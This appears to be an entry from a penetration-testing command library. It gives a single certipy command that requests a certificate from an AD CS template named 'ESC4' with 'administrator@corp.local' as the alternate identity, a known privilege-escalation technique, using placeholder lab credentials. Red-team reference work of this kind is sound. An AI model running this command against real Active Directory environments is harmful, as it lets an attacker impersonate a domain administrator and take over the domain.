---
id: eb8a49df-baeb-4119-afce-7d6ff93bef51
name: Request Certificate with ESC4 Template
type: command
executor: bash
data: certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template
  'ESC4' -alt 'administrator@corp.local'
output: null
created_at: '2023-04-06T03:56:05.850106+00:00'
updated_at: '2023-04-10T20:25:59.025048+00:00'
---

# Request Certificate with ESC4 Template

```bash
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC4' -alt 'administrator@corp.local'
```


